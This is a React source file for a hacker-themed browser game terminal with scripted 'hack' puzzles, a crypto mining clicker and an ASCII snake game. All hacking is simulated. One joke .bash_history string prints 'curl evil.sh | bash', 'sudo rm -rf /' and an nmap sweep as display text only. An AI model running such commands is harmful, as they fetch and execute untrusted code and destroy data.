// terminal.jsx — command-line shell with hack/mine/snake mini-games
const { useState: useStateT, useEffect: useEffectT, useRef: useRefT } = React;

// ---- Hack targets ----
const HACK_TARGETS = [
  { host: "gibson.mil",        ip: "10.0.4.7",    difficulty: 1, reward: 0.015, flavor: "US Military relay — low-sec gateway.", kind: "portscan" },
  { host: "mainframe.ellingson", ip: "198.51.100.23", difficulty: 2, reward: 0.04, flavor: "Ellingson Mineral Co. — rainbow books onsite.", kind: "password" },
  { host: "gateway.globalnet",   ip: "203.0.113.8",  difficulty: 2, reward: 0.035, flavor: "Tokyo uplink. Try not to trip the ICE.", kind: "cipher" },
  { host: "darkstar.corp",       ip: "172.16.9.42",  difficulty: 3, reward: 0.09,  flavor: "Corporate mainframe. Heavy firewall.", kind: "portscan" },
  { host: "nsa.gov.ghost",       ip: "192.0.2.99",   difficulty: 4, reward: 0.22,  flavor: "⚠ THREE LETTER AGENCY — trace enabled", kind: "password" },
  { host: "orbital.sat-7",       ip: "198.18.7.7",   difficulty: 3, reward: 0.12,  flavor: "Low-orbit sat uplink. Window: 90 seconds.", kind: "cipher" },
  { host: "atm-central.bnk",     ip: "10.10.10.10",  difficulty: 2, reward: 0.055, flavor: "First National ATM switch.", kind: "password" },
  { host: "phreak.pbx.7734",     ip: "64.64.64.64",  difficulty: 1, reward: 0.02,  flavor: "Old PBX. Tone-dial still works.", kind: "portscan" },
];

const PASSWORDS = ["godmode","swordfish","hunter2","rosebud","letmein","joshua","orange","trustno1","matrix","neural","megaman","zer0cool","crashoverride","acid","phreak","cyber"];
const CIPHER_PHRASES = ["THE MEDIUM IS THE MESSAGE","HACK THE PLANET","MESS WITH THE BEST","TRUST NO ONE","MIND IS A RAZOR BLADE","RESISTANCE IS FUTILE"];

function rot13(s) {
  return s.replace(/[A-Z]/g, c => String.fromCharCode((c.charCodeAt(0) - 65 + 13) % 26 + 65));
}

// Render ANSI-ish lines
function TermLine({ text, cls }) {
  return <div className={"term-line " + (cls || "")}>{text}</div>;
}

function Terminal({ state, setState, onOpenApp }) {
  const [lines, setLines] = useStateT(() => []);
  const [input, setInput] = useStateT("");
  const [history, setHistory] = useStateT([]);
  const [histIdx, setHistIdx] = useStateT(-1);
  const [mode, setMode] = useStateT({ name: "shell" });
  const [busy, setBusy] = useStateT(false);
  const bodyRef = useRefT(null);
  const inputRef = useRefT(null);

  const push = (text, cls) => setLines(ls => [...ls, { text, cls, id: Math.random() }]);
  const typeOut = async (text, cls, speedMul = 1) => {
    const tokens = text.split("");
    let buf = "";
    const id = Math.random();
    setLines(ls => [...ls, { text: "", cls, id }]);
    const perChar = Math.max(4, (100 / (window.__typeSpeed || 22)) * speedMul);
    for (let i = 0; i < tokens.length; i++) {
      buf += tokens[i];
      setLines(ls => ls.map(l => l.id === id ? { ...l, text: buf } : l));
      if (i % 3 === 0) Audio.key();
      await new Promise(r => setTimeout(r, perChar));
    }
  };

  useEffectT(() => {
    (async () => {
      await typeOut(" /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$", "mag", 0.3);
      await typeOut("| $$  | $$ /$$__  $$ /$$__  $$| $$  /$$/", "mag", 0.3);
      await typeOut("| $$$$$$$$| $$$$$$$$| $$      | $$$$$$/ ", "mag", 0.3);
      await typeOut("| $$_  $$ | $$__  $$| $$      | $$__  $$", "mag", 0.3);
      await typeOut("| $$  | $$| $$  | $$|  $$$$$$/| $$  \\ $$", "mag", 0.3);
      await typeOut("|__/  |__/|__/  |__/ \\______/ |__/  |__/", "mag", 0.3);
      push("", "");
      await typeOut("HX//OS 2.4 — Terminal Session 0xDEADBEEF", "ok");
      await typeOut(`Welcome back, operator. Hashrate: ${state.hashrate} H/s  Balance: ${fmtCrypto(state.crypto)} ⟠`, "dim");
      push("Type 'help' to list commands.", "");
      push("", "");
    })();
    setTimeout(() => inputRef.current?.focus(), 100);
  }, []);

  useEffectT(() => {
    if (bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight;
  }, [lines]);

  const runCmd = async (raw) => {
    const cmd = raw.trim();
    push(`root@hx-os:~# ${cmd}`, "");
    if (!cmd) return;
    setHistory(h => [...h, cmd]);
    setHistIdx(-1);
    const [c, ...args] = cmd.split(/\s+/);
    setBusy(true);
    try { await dispatch(c.toLowerCase(), args, cmd); }
    catch (e) { push("!! error: " + e.message, "err"); }
    setBusy(false);
  };

  const dispatch = async (c, args, raw) => {
    switch (c) {
      case "help": return help();
      case "clear": case "cls": return setLines([]);
      case "whoami": return push("root (uid=0) gid=0(wheel) — you are Zero Cool", "ok");
      case "date": return push(new Date().toString(), "dim");
      case "ls": return push("bin/  etc/  home/  var/  exploits/  wallet.dat  .bash_history", "");
      case "cat":
        if (args[0] === "wallet.dat") return push(`[ENCRYPTED WALLET]  balance: ${fmtCrypto(state.crypto)} ⟠`, "ok");
        if (args[0] === ".bash_history") return push("sudo rm -rf /\nnmap -sS 10.0.0.0/8\ncurl evil.sh | bash\necho 'oh no'", "dim");
        return push("cat: " + (args[0] || "???") + ": no such file", "err");
      case "balance": case "wallet":
        return push(`⟠ ${fmtCrypto(state.crypto)}   (hashrate: ${state.hashrate} H/s)`, "ok");
      case "scan": case "nmap":
        return scanHosts();
      case "hack": case "exploit":
        return hackHost(args[0]);
      case "mine":
        onOpenApp("miner");
        return push("> launching miner.app…", "ok");
      case "snake":
        return playSnake();
      case "browser": case "browse":
        onOpenApp("browser");
        return push("> launching net::browser…", "ok");
      case "notes": case "nano":
        onOpenApp("notepad");
        return push("> opening notepad…", "ok");
      case "calc":
        onOpenApp("calculator");
        return push("> calc.exe — launched", "ok");
      case "trash":
        onOpenApp("trash");
        return push("> /tmp/.Trash — opening", "ok");
      case "upgrade": case "shop":
        return listUpgrades(args[0]);
      case "sudo":
        push("[sudo] password for root: ••••••••", "dim");
        await sleep(500);
        return push("sudo: nice try.", "err");
      case "rm":
        if (args.includes("-rf") && args.includes("/")) {
          await typeOut("rm: catastrophic kernel panic", "err");
          await typeOut("haha. just kidding.", "dim");
          return;
        }
        return push(`rm: ${args[0] || "?"}: cannot remove`, "err");
      case "exit": case "logout":
        return push("connection held open. ESC to close window.", "dim");
      case "reset":
        if (confirm("Wipe all progress?")) { localStorage.removeItem(STORAGE_KEY); location.reload(); }
        return;
      case "matrix":
        return matrix();
      case "coffee":
        return push("☕ nothing happens. but you feel more alert.", "ok");
      default:
        return push(`bash: ${c}: command not found. try 'help'`, "err");
    }
  };

  const help = () => {
    const cmds = [
      ["help", "this menu"],
      ["scan / nmap", "list reachable hosts"],
      ["hack <host>", "attempt to breach a target"],
      ["mine", "launch crypto miner"],
      ["snake", "the classic. highscore wins ⟠"],
      ["upgrade [rig|cpu|net]", "spend ⟠ on hardware"],
      ["balance", "show wallet"],
      ["browser / notes / calc / trash", "open GUI apps"],
      ["whoami, ls, cat, date", "unix classics"],
      ["matrix", "…follow the white rabbit"],
      ["clear", "clear screen"],
      ["reset", "wipe saved progress"],
    ];
    push("─── AVAILABLE COMMANDS ─────────────────────", "mag");
    cmds.forEach(([c, d]) => push(`  ${c.padEnd(22)} ${d}`, ""));
    push("────────────────────────────────────────────", "mag");
  };

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  const scanHosts = async () => {
    await typeOut("Running TCP SYN scan across known subnets...", "dim");
    await sleep(220);
    await typeOut("╔════════════════════════════════════════════════╗", "mag", 0.2);
    await typeOut("║  HOST                  IP              SEC    ║", "mag", 0.2);
    await typeOut("╠════════════════════════════════════════════════╣", "mag", 0.2);
    for (const t of HACK_TARGETS) {
      const sec = "▰".repeat(t.difficulty) + "▱".repeat(5 - t.difficulty);
      const hackedTag = state.hackedHosts.includes(t.host) ? " [OWNED]" : "";
      const line = `║  ${t.host.padEnd(21)} ${t.ip.padEnd(15)} ${sec}${hackedTag}`;
      await typeOut(line.padEnd(49) + "║", state.hackedHosts.includes(t.host) ? "ok" : "", 0.2);
    }
    await typeOut("╚════════════════════════════════════════════════╝", "mag", 0.2);
    push("→ use: hack <host>", "dim");
  };

  const hackHost = async (name) => {
    const t = HACK_TARGETS.find(x => x.host === name || x.ip === name);
    if (!t) return push(`hack: unknown host '${name || ""}'. try 'scan'.`, "err");
    if (state.hackedHosts.includes(t.host)) return push(`already owned: ${t.host}. but you can still try.`, "dim");

    await typeOut(`[*] Connecting to ${t.host} (${t.ip})…`, "dim");
    await sleep(300);
    await typeOut(`[*] ${t.flavor}`, "mag");
    await sleep(250);

    if (t.kind === "portscan") return hackPortscan(t);
    if (t.kind === "password") return hackPassword(t);
    if (t.kind === "cipher") return hackCipher(t);
  };

  const hackPortscan = async (t) => {
    const ports = [];
    const pool = [21, 22, 23, 25, 80, 110, 143, 443, 445, 1337, 3389, 8080, 31337];
    const open = pool.sort(() => Math.random() - 0.5).slice(0, 3 + t.difficulty);
    for (const p of pool.slice(0, 8 + t.difficulty)) {
      const isOpen = open.includes(p);
      const svc = { 21:"ftp",22:"ssh",23:"telnet",25:"smtp",80:"http",110:"pop3",143:"imap",443:"https",445:"smb",1337:"elite",3389:"rdp",8080:"http-alt",31337:"backdoor" }[p] || "?";
      await typeOut(`   ${p}/tcp  ${isOpen ? "OPEN  " : "closed"}  ${svc}`, isOpen ? "ok" : "dim", 0.15);
      if (isOpen) ports.push(p);
      await sleep(40);
    }
    const target = open[open.length - 1];
    push(`[?] Which port do you exploit? (type number)`, "warn");
    const answer = await prompt(`exploit :`);
    if (parseInt(answer) === target) {
      await hackSuccess(t);
    } else {
      await hackFail(t, `wrong port. the backdoor was ${target}/tcp.`);
    }
  };

  const hackPassword = async (t) => {
    const real = PASSWORDS[Math.floor(Math.random() * PASSWORDS.length)];
    const hint = real[0] + "·".repeat(real.length - 2) + real[real.length - 1];
    await typeOut(`[*] Dictionary attack against admin account…`, "dim");
    await sleep(300);
    await typeOut(`[!] Fragment recovered from memory dump:  ${hint}`, "warn");
    await typeOut(`[!] Length: ${real.length}. Possible words in leaked DB:`, "warn");
    const choices = [real, ...PASSWORDS.filter(p => p !== real).filter(p => p.length >= real.length - 1 && p.length <= real.length + 1).slice(0, 5)].sort(() => Math.random() - 0.5).slice(0, 5);
    if (!choices.includes(real)) choices[0] = real;
    choices.forEach((p, i) => push(`   [${i+1}] ${p}`, ""));
    const answer = await prompt(`password> `);
    const i = parseInt(answer) - 1;
    if (choices[i] === real) await hackSuccess(t);
    else await hackFail(t, `wrong. it was '${real}'.`);
  };

  const hackCipher = async (t) => {
    const phrase = CIPHER_PHRASES[Math.floor(Math.random() * CIPHER_PHRASES.length)];
    const encoded = rot13(phrase);
    await typeOut(`[*] Intercepted transmission (ROT-13 suspected):`, "dim");
    await typeOut(`    ${encoded}`, "warn");
    await typeOut(`[?] Decrypt the above phrase.`, "mag");
    const answer = await prompt(`plaintext> `);
    if (answer.toUpperCase().replace(/[^A-Z ]/g, "") === phrase) await hackSuccess(t);
    else await hackFail(t, `wrong. it was '${phrase}'.`);
  };

  const hackSuccess = async (t) => {
    await typeOut(`[✓] BREACH SUCCESSFUL — ${t.host}`, "ok");
    Audio.ok();
    await typeOut(`[$] Transferring ${t.reward.toFixed(4)} ⟠ to wallet…`, "ok");
    setState(s => ({ ...s, crypto: s.crypto + t.reward, hackedHosts: Array.from(new Set([...s.hackedHosts, t.host])) }));
    await typeOut(`[$] Hack the planet.`, "mag");
  };
  const hackFail = async (t, reason) => {
    await typeOut(`[×] DETECTED. ICE engaged. Disconnecting…`, "err");
    Audio.err();
    await typeOut(`    ${reason}`, "dim");
  };

  // prompt helper: pauses the shell for a reply
  const pendingRef = useRefT(null);
  const prompt = (label) => new Promise((resolve) => {
    setMode({ name: "prompt", label });
    pendingRef.current = resolve;
  });
  const resolvePrompt = (val) => {
    if (pendingRef.current) {
      const r = pendingRef.current;
      pendingRef.current = null;
      setMode({ name: "shell" });
      push(`${mode.label || "?"}${val}`, "");
      r(val);
    }
  };

  const listUpgrades = (which) => {
    const items = [
      { k: "rig", name: "Mining Rig", level: state.rigLevel, cost: (state.rigLevel * 0.05), effect: "+5 H/s", apply: s => ({ ...s, rigLevel: s.rigLevel + 1, hashrate: s.hashrate + 5 }) },
      { k: "cpu", name: "Overclock CPU", level: state.cpuLevel, cost: (state.cpuLevel * 0.08), effect: "+10 H/s, faster hacks", apply: s => ({ ...s, cpuLevel: s.cpuLevel + 1, hashrate: s.hashrate + 10 }) },
      { k: "net", name: "Dark Fiber", level: state.netLevel, cost: (state.netLevel * 0.12), effect: "+25 H/s", apply: s => ({ ...s, netLevel: s.netLevel + 1, hashrate: s.hashrate + 25 }) },
    ];
    if (!which) {
      push("─── HARDWARE UPGRADES ─────────────", "mag");
      items.forEach(it => push(`  ${it.k.padEnd(5)} L${it.level}  cost ${fmtCrypto(it.cost)} ⟠   ${it.effect}`, ""));
      push("  buy with: upgrade <rig|cpu|net>", "dim");
      return;
    }
    const it = items.find(x => x.k === which);
    if (!it) return push("upgrade: unknown part", "err");
    if (state.crypto < it.cost) return push(`insufficient funds. need ${fmtCrypto(it.cost)} ⟠.`, "err");
    setState(s => { const ns = it.apply(s); ns.crypto = s.crypto - it.cost; return ns; });
    push(`[+] installed ${it.name} L${it.level + 1}. ${it.effect}.`, "ok");
    Audio.coin();
  };

  const matrix = async () => {
    const cols = 40;
    for (let r = 0; r < 14; r++) {
      let s = "";
      for (let c = 0; c < cols; c++) s += "01アイウエカキクケコサシスセ"[Math.floor(Math.random() * 14)];
      await typeOut(s, "ok", 0.1);
    }
    push("wake up.", "mag");
  };

  // ---- Snake in-terminal ----
  const [snake, setSnake] = useStateT(null);

  const playSnake = () => {
    push("─── SNAKE.SH — arrow keys to play, Q to quit ───", "mag");
    setSnake({ state: "play" });
  };

  // input
  const onKey = async (e) => {
    if (busy && mode.name === "shell") return;
    if (e.key === "Enter") {
      if (mode.name === "prompt") { resolvePrompt(input); setInput(""); return; }
      const v = input; setInput(""); await runCmd(v);
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      if (history.length) { const i = histIdx < 0 ? history.length - 1 : Math.max(0, histIdx - 1); setHistIdx(i); setInput(history[i]); }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (histIdx >= 0) { const i = histIdx + 1; if (i >= history.length) { setHistIdx(-1); setInput(""); } else { setHistIdx(i); setInput(history[i]); } }
    }
  };

  const promptStr = mode.name === "prompt" ? mode.label : "root@hx-os:~#";

  return (
    <div className="terminal-body" ref={bodyRef} onClick={() => inputRef.current?.focus()}>
      {lines.map(l => <TermLine key={l.id} text={l.text} cls={l.cls} />)}
      {snake && snake.state === "play" && (
        <SnakeInline onDone={(score) => {
          const reward = Math.max(0, Math.floor(score / 3)) * 0.002;
          push(`[GAME OVER] score: ${score}. reward: ${reward.toFixed(4)} ⟠`, reward > 0 ? "ok" : "dim");
          if (score > state.snakeHigh) push(`[!] new high score!`, "mag");
          setState(s => ({ ...s, crypto: s.crypto + reward, snakeHigh: Math.max(s.snakeHigh, score) }));
          setSnake(null);
          setTimeout(() => inputRef.current?.focus(), 50);
        }} />
      )}
      {!snake && (
        <div className="term-input-line">
          <span className="prompt">{promptStr}</span>
          <input
            ref={inputRef}
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={onKey}
            autoFocus
            spellCheck={false}
            autoComplete="off"
          />
        </div>
      )}
    </div>
  );
}

// ---- Inline Snake (ASCII, in-terminal) ----
function SnakeInline({ onDone }) {
  const W = 28, H = 14;
  const [snake, setSnake] = useStateT([{ x: 5, y: 7 }, { x: 4, y: 7 }, { x: 3, y: 7 }]);
  const [dir, setDir] = useStateT({ x: 1, y: 0 });
  const [food, setFood] = useStateT({ x: 12, y: 7 });
  const [score, setScore] = useStateT(0);
  const [alive, setAlive] = useStateT(true);
  const dirRef = useRefT(dir);
  dirRef.current = dir;
  const aliveRef = useRefT(true);
  aliveRef.current = alive;

  useEffectT(() => {
    const onK = (e) => {
      if (!aliveRef.current) return;
      const d = dirRef.current;
      if ((e.key === "ArrowUp" || e.key === "w") && d.y !== 1) setDir({ x: 0, y: -1 });
      else if ((e.key === "ArrowDown" || e.key === "s") && d.y !== -1) setDir({ x: 0, y: 1 });
      else if ((e.key === "ArrowLeft" || e.key === "a") && d.x !== 1) setDir({ x: -1, y: 0 });
      else if ((e.key === "ArrowRight" || e.key === "d") && d.x !== -1) setDir({ x: 1, y: 0 });
      else if (e.key === "q" || e.key === "Q" || e.key === "Escape") { aliveRef.current = false; setAlive(false); onDone(score); }
      if (e.key.startsWith("Arrow")) e.preventDefault();
    };
    window.addEventListener("keydown", onK);
    return () => window.removeEventListener("keydown", onK);
  }, []);

  useEffectT(() => {
    if (!alive) return;
    const id = setInterval(() => {
      setSnake(prev => {
        const head = { x: prev[0].x + dirRef.current.x, y: prev[0].y + dirRef.current.y };
        if (head.x < 0 || head.x >= W || head.y < 0 || head.y >= H || prev.some(s => s.x === head.x && s.y === head.y)) {
          aliveRef.current = false;
          setAlive(false);
          setTimeout(() => onDone(scoreRef.current), 10);
          return prev;
        }
        const ate = head.x === foodRef.current.x && head.y === foodRef.current.y;
        const next = [head, ...prev];
        if (!ate) next.pop();
        else {
          Audio.coin();
          scoreRef.current += 1;
          setScore(scoreRef.current);
          let nf;
          do { nf = { x: Math.floor(Math.random() * W), y: Math.floor(Math.random() * H) }; }
          while (next.some(s => s.x === nf.x && s.y === nf.y));
          setFood(nf);
          foodRef.current = nf;
        }
        return next;
      });
    }, 120);
    return () => clearInterval(id);
  }, [alive]);

  const scoreRef = useRefT(0);
  const foodRef = useRefT(food);

  // render grid
  const grid = [];
  for (let y = 0; y < H; y++) {
    let row = "";
    for (let x = 0; x < W; x++) {
      if (snake.some((s, i) => s.x === x && s.y === y && i === 0)) row += "@";
      else if (snake.some(s => s.x === x && s.y === y)) row += "o";
      else if (food.x === x && food.y === y) row += "◆";
      else row += "·";
    }
    grid.push(row);
  }
  return (
    <div>
      <div className="term-line mag">SCORE: {score}    [arrows to move, Q to quit]</div>
      <div className="term-line ok">┌{"─".repeat(W)}┐</div>
      {grid.map((r, i) => <div key={i} className="term-line ok">│{r}│</div>)}
      <div className="term-line ok">└{"─".repeat(W)}┘</div>
    </div>
  );
}

window.Terminal = Terminal;
